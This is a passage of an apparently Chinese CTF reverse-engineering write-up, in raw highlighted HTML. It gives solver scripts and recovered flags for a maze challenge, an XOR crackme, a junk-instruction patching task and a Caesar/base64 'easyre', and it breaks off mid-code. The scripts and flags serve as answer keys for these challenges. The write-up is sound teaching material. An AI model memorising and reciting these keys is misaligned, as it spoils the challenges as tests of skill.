punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    start<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    end<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>    path<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 清空路径列表</span>    find_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span>    see_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>path<span class="token punctuation">)</span> <span class="token comment">#wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1你知道什么是py嘛"><a class="markdownIt-Anchor" href="#hnctf-2022-week1你知道什么是py嘛"></a> [HNCTF 2022 Week1]你知道什么是Py嘛？</h2><h3 id="题目描述-24"><a class="markdownIt-Anchor" href="#题目描述-24"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">35</span>  <span class="token keyword">or</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span>arr<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error!"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-23"><a class="markdownIt-Anchor" href="#exp-23"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'N'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag_list<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;Pyth0n_1s_th3_best_l@nguage&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nssround3-teamjump_by_jump_revenge"><a class="markdownIt-Anchor" href="#nssround3-teamjump_by_jump_revenge"></a> [NSSRound#3 Team]jump_by_jump_revenge</h2><h3 id="题目描述-25"><a class="markdownIt-Anchor" href="#题目描述-25"></a> 题目描述</h3><p>翻一翻，有个地方爆红了，是花指令。<br />208003<br />选中红的这里，按’U’，用16进制显示，把&quot;0E90&quot;NOP掉。<br />208102<br />重新对main函数反编译，F5可以查看到正常的伪代码。<br />208196</p><h3 id="exp-24"><a class="markdownIt-Anchor" href="#exp-24"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">'''''这是正向流程for i in range(28):    k=(i*i+123)%21    a[i]=(a[i]+a[k]) % 0x60 + 0x20'''</span><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">''''''</span><span class="token string">''</span>a<span class="token operator">=</span><span class="token string">"~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*"</span>a<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    k<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">21</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">+</span>j<span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> x<span class="token operator">>=</span><span class="token number">33</span> <span class="token keyword">and</span> x<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>            a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="羊城杯-2020easyre"><a class="markdownIt-Anchor" href="#羊城杯-2020easyre"></a> [羊城杯 2020]easyre</h2><h3 id="题目描述-26"><a class="markdownIt-Anchor" href="#题目描述-26"></a> 题目描述</h3><h4 id="第二重加密"><a class="markdownIt-Anchor" href="#第二重加密"></a> 第二重加密</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__int64 __fastcall encode_two(const char *a1, int a2, char *a3, int *a4)&#123;  char *Source; &#x2F;&#x2F; [rsp+40h] [rbp+10h]  char *v6; &#x2F;&#x2F; [rsp+50h] [rbp+20h]  Source &#x3D; (char *)a1;  v6 &#x3D; a3;  if ( !a1 || !a2 )    return 0xFFFFFFFFi64;  strncpy(a3, a1 + 26, 0xDui64);  strncpy(v6 + 13, Source, 0xDui64);  strncpy(v6 + 26, Source + 39, 0xDui64);  strncpy(v6 + 39, Source + 13, 0xDui64);  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>encode_two(&amp;v10, v4, &amp;v9, &amp;v12) == 0</p><p>根据前面的推断，第三个参数应该是加密后的密文，用一个Source指针指向原来的明文，然后进行strncpy操作</p><p>strncpy(a3, a1 + 26, 0xDui64);</p><p>strncpy(v6 + 13, Source, 0xDui64);</p><p>strncpy(v6 + 26, Source + 39, 0xDui64);</p><p>strncpy(v6 + 39, Source + 13, 0xDui64);</p><p>就是一个简单的替换加密</p><h4 id="第三重加密"><a class="markdownIt-Anchor" href="#第三重加密"></a> 第三重加密</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__int64 __fastcall encode_three(const char *flag3, int lflag3, char *str1, int *a4)&#123;  char v5; &#x2F;&#x2F; [rsp+Fh] [rbp-11h]  int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]  const char *strflag3index; &#x2F;&#x2F; [rsp+30h] [rbp+10h]  strflag3index &#x3D; flag3;  if ( !flag3 || !lflag3 )    return 0xFFFFFFFFi64;  for ( i &#x3D; 0; i &lt; lflag3; ++i )  &#123;    v5 &#x3D; *strflag3index;    if ( *strflag3index &lt;&#x3D; 64 || v5 &gt; 90 )    &#123;      if ( v5 &lt;&#x3D; &#39;&#96;&#39; || v5 &gt; &#39;z&#39; )      &#123;        if ( v5 &lt;&#x3D; &#39;&#x2F;&#39; || v5 &gt; &#39;9&#39; )          *str1 &#x3D; v5;        else          *str1 &#x3D; (v5 - &#39;0&#39; + 3) % 10 + &#39;0&#39;;      &#125;      else      &#123;        *str1 &#x3D; (v5 - &#39;a&#39; + 3) % 26 + &#39;a&#39;;      &#125;    &#125;    else    &#123;      *str1 &#x3D; (v5 - &#39;A&#39; + 3) % 26 + &#39;A&#39;;    &#125;    ++str1;    ++strflag3index;  &#125;  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这实际上是右移量为3的凯撒加密算法</p><h3 id="exp-25"><a class="markdownIt-Anchor" href="#exp-25"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''正向过程先base64加密再encode2位交换再encode3凯撒加密   '''</span><span class="token keyword">import</span> base64Str1<span class="token operator">=</span><span class="token string">"EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG"</span><span class="token keyword">def</span> <span class="token function">decrypt_caesar</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#解谜函数</span>    text<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            text<span class="token operator">+=</span>i    <span class="token keyword">return</span> textflag3<span class="token operator">=</span>decrypt_caesar<span class="token punctuation">(</span>Str1<span class="token punctuation">)</span>flag2<span class="token operator">=</span>flag3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    flag2 <span class="token operator">+=</span> <span class="token string">"="</span>flag1<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span> <span class="token comment">#b'GWHT&#123;672cc4778a38e80cb362987341133ea2&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gwctf-2019pyre"><a class="markdownIt-Anchor" href="#gwctf-2019pyre"></a> [GWCTF 2019]pyre</h2><h3 id="题目描述-27"><a class="markdownIt-Anchor" href="#题目描述-27"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token string">"Welcome to Re World!"</span><span class="token keyword">print</span> <span class="token string">"Your input1 is your flag~"</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token 